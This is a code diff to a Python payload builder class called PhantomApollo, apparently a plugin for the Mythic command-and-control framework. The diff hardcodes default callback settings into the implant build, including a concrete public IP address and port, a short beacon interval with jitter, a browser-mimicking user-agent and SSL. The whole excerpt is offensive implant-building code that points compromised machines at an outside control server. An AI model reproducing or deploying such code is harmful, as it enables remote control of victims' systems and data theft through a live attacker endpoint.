@@ -73,17 +73,17 @@ class PhantomApollo(PayloadType):
     async def build(self) -> BuildResponse:
         resp = BuildResponse(status=BuildStatus.Success)
         
-        # Build parameters
-        callback_host = self.get_parameter("callback_host")
-        callback_port = self.get_parameter("callback_port") 
-        callback_interval = self.get_parameter("callback_interval")
-        callback_jitter = self.get_parameter("callback_jitter")
-        use_ssl = self.get_parameter("use_ssl")
-        user_agent = self.get_parameter("user_agent")
-        aes_psk = self.get_parameter("aes_psk")
-        debug = self.get_parameter("debug")
+        # Build parameters with your Mythic server
+        callback_host = self.get_parameter("callback_host") or "37.27.249.191"
+        callback_port = self.get_parameter("callback_port") or "7443"
+        callback_interval = self.get_parameter("callback_interval") or "10"
+        callback_jitter = self.get_parameter("callback_jitter") or "10"
+        use_ssl = self.get_parameter("use_ssl") if self.get_parameter("use_ssl") is not None else True
+        user_agent = self.get_parameter("user_agent") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        aes_psk = self.get_parameter("aes_psk") or ""
+        debug = self.get_parameter("debug") if self.get_parameter("debug") is not None else True
         
-        # Construct callback URL
+        # Construct callback URL for your Mythic server
         protocol = "https" if use_ssl else "http"
         callback_url = f"{protocol}://{callback_host}:{callback_port}"
         
